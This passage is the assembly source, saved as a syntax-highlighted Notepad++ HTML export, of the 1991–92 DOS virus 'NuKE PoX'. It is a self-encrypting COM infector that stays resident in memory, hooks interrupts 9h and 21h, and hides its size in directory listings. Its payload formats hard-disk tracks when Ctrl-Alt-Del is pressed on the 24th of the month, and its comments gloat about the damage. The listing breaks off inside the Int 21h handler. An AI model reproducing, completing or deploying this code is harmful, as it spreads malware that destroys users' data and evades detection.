<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-</span><span class="sc0">
</span><span class="sc1">;-*      (c) Rock Steady, Viral Developments                             -*</span><span class="sc0">
</span><span class="sc1">;*-      (c) NuKE Software Developement  1991, 1992                      *-</span><span class="sc0">
</span><span class="sc1">;-*  Virus: NuKE PoX Version 1.0  (Alias `Mutating Rocko')               -*</span><span class="sc0">
</span><span class="sc1">;*-  ~~~~~~                                                              *-</span><span class="sc0">
</span><span class="sc1">;-*  Notes: COM Infector, Hooks Int 9h &amp; Int 21h, Memory Stealthness     -*</span><span class="sc0">
</span><span class="sc1">;*-  ~~~~~~ Dir Stealthness (FCB Way), Encrypting Virus (100 different   *-</span><span class="sc0">
</span><span class="sc1">;-*         Encrypted Copies of the Virus)                               -*</span><span class="sc0">
</span><span class="sc1">;*-  Bytes: 609 Bytes           Memory: (609 * 2) = 1,218 Bytes          *-</span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc5">crypt_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">init_virus</span><span class="sc0">    </span><span class="sc1">;All that gets Incrypted     </span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">init_virus</span><span class="sc0">     </span><span class="sc1">;Size of the Virus           </span><span class="sc0">
</span><span class="sc5">mut1</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                                                  
</span><span class="sc5">mut2</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">                                                  
</span><span class="sc5">mut3</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">103h</span><span class="sc0">                                               
</span><span class="sc5">del_code</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">53h</span><span class="sc0">                   </span><span class="sc1">;CTRL-ATL-DEL Key            </span><span class="sc0">
</span><span class="sc5">seg_a</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">                                        
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc0">                                 
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">                                               
</span><span class="sc5">rocko</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">                                                
                                                                           
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">init_virus</span><span class="sc0">                              </span><span class="sc1">;+3 bytes  </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-[Start of Virus]*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">init_virus</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0">         </span><span class="sc1">;Decryption Routine Please  ;+3 Bytes  </span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doit_now</span><span class="sc0">        </span><span class="sc1">;Doit VirusMan...           ;+3 Bytes  </span><span class="sc0">
                                                                </span><span class="sc1">;========  </span><span class="sc0">
</span><span class="sc5">doit_now</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">;Anything ABOVE THIS LINE     9 Bytes  </span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">109h</span><span class="sc0">         </span><span class="sc1">;have to be added to the 100h! This    </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;SETs our `Delta Pointer'.             </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                     
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                                                     
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;Save registers                        </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                                                     
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                                                     
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                                                     
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                     
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                                                     
                                                                           
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0abcdh</span><span class="sc0">       </span><span class="sc1">;Are we resident Already?              </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                    
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0abcdh</span><span class="sc0">       </span><span class="sc1">;Yupe... Quit Then...                  </span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_com</span><span class="sc0">                                               
                                                                           
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">;Get CS=DS                             </span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                     
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                                                  
                                                                           
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3509h</span><span class="sc0">        </span><span class="sc1">;Hook Int 9 Please...                  </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                    
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int9</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">     </span><span class="sc1">;Save Orignal Int 9h   </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int9</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">;Save Orignal Int 9h   </span><span class="sc0">
                                                                           
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">;Some AVs may INTCEPT this Call!       </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;May be better to go Manually...       </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">;Save the Int          </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">;Vector Table          </span><span class="sc0">
                                                                           
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                </span><span class="sc1">;Get a new Memory block              </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">             </span><span class="sc1">;Put it Back to ES                   </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">mut1</span><span class="sc0">                                             
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc5">virus_size</span><span class="sc0"> </span><span class="sc1">;Size to `Hide'               </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;And all this crap hides               </span><span class="sc0">
            </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">;your number of bytes in DX            </span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                                   
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                                                  
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                  
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                     
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                                  
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">          </span><span class="sc1">;Call int to do it...                  </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                    
                                                                           
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_com</span><span class="sc0">                                               
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                                                 
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                     
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;It's Done... Yeah!                    </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                    
                                                                           
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_com</span><span class="sc0">                                               
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                     
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                  
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">           </span><span class="sc1">;Here we move our Virus into           </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">mut2</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">;the `Hidden' memory!                  </span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                                                 
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">mut3</span><span class="sc0">                                                
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                  
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                                                  
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init_virus</span><span class="sc0">                                   
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                                          
            </span><span class="sc6">cld</span><span class="sc0">                                                            
            </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">                                                  
                                                                           
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">                </span><span class="sc1">;Restore Int21 with ours       </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_handler</span><span class="sc0"> </span><span class="sc1">;Where it starts               </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                     
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                    
                                                                           
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2509h</span><span class="sc0">                </span><span class="sc1">;Restore Int9 with ours        </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int9_handler</span><span class="sc0">  </span><span class="sc1">;The Handler...                </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                    
                                                                           
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                     
</span><span class="sc5">exit_com</span><span class="sc4">:</span><span class="sc0">                                                                  
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">        </span><span class="sc1">; Its a COM file restore       </span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                   </span><span class="sc1">; First three Bytes...         </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Mov the Byte to AX           </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; First two bytes Restored     </span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; Get the next Byte            </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Move the Byte to AL          </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">102h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Restore the Last of 3 Byt    </span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; Restore Regesters            </span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                     
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                     
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; Jump Back to Beginning       </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Restores our IP (a CALL      </span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">; Saves them, now we change    </span><span class="sc0">
</span><span class="sc5">int21</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;Our Old Int21                         </span><span class="sc0">
</span><span class="sc5">int9</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;Our Old Int9                          </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*[Int 9h Handler]-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">int9_handler</span><span class="sc4">:</span><span class="sc0">                                                              
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                     
            </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">          </span><span class="sc1">;Has the user attempted a              </span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">del_code</span><span class="sc0">     </span><span class="sc1">;CTRL-ALT-DEL                          </span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">warm_reboot</span><span class="sc0">     </span><span class="sc1">;Yes! Screw him                        </span><span class="sc0">
</span><span class="sc5">bye_bye</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                     
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int9</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Nope, Leave alone              </span><span class="sc0">
</span><span class="sc5">warm_reboot</span><span class="sc4">:</span><span class="sc0">                                                               
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">             </span><span class="sc1">;Get Date Please                    </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                    
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">          </span><span class="sc1">;Is it 24th of the Month?              </span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bye_bye</span><span class="sc0">         </span><span class="sc1">;Yes, bye_Bye HD                       </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                                   
</span><span class="sc5">hurt_me</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                                                 
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                                   
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">;Formats a few tracks...               </span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">             </span><span class="sc1">;Hurts So good...                      </span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc0">                                                     
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                                 
            </span><span class="sc6">loopne</span><span class="sc0">  </span><span class="sc5">hurt_me</span><span class="sc0">                                                
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">;Reboot!                     </span><span class="sc0">
            </span><span class="sc6">iret</span><span class="sc0">                                                           
</span><span class="sc1">;-*-*-*-*-*-*-*-*-[Dir Stealth Handler]-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">dir_handler</span><span class="sc4">:</span><span class="sc0">                                                               
             </span><span class="sc6">pushf</span><span class="sc0">                                                         
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                    
             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21call</span><span class="sc0">       </span><span class="sc1">;Get file Stats                       </span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;Good FCB?                            </span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_good</span><span class="sc0">         </span><span class="sc1">;nope                                 </span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">          </span><span class="sc1">;Is this Undocmented? huh...          </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                                 
             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                                           
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">    </span><span class="sc1">;Not for us man...                    </span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                 
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                                               
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">          </span><span class="sc1">;Get file DTA                         </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
                                                                           
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                                                    
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fcb_okay</span><span class="sc0">                                              
             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                                                 
</span><span class="sc5">fcb_okay</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">                                        
             </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">          </span><span class="sc1">;UnMask Seconds Field                 </span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">          </span><span class="sc1">;Is in 58 seconds?                    </span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">    </span><span class="sc1">;Nope...                              </span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0e0h</span><span class="sc0">                             
             </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">virus_size</span><span class="sc0">    </span><span class="sc1">;Yes minus virus size       </span><span class="sc0">
             </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                        
</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                    
</span><span class="sc5">no_good</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">iret</span><span class="sc0">                                                          
</span><span class="sc1">;-*-*-*-*-*-*-*-*[Int 21h Handler]*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">int21_handler</span><span class="sc4">:</span><span class="sc0">                                                             
             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">        </span><span class="sc1">;File executed                        </span><span class="sc0">
             </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">execute</span><span class="sc0">                                               
             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">          </span><span class="sc1">;Dir handler                          </span><span class="sc0">
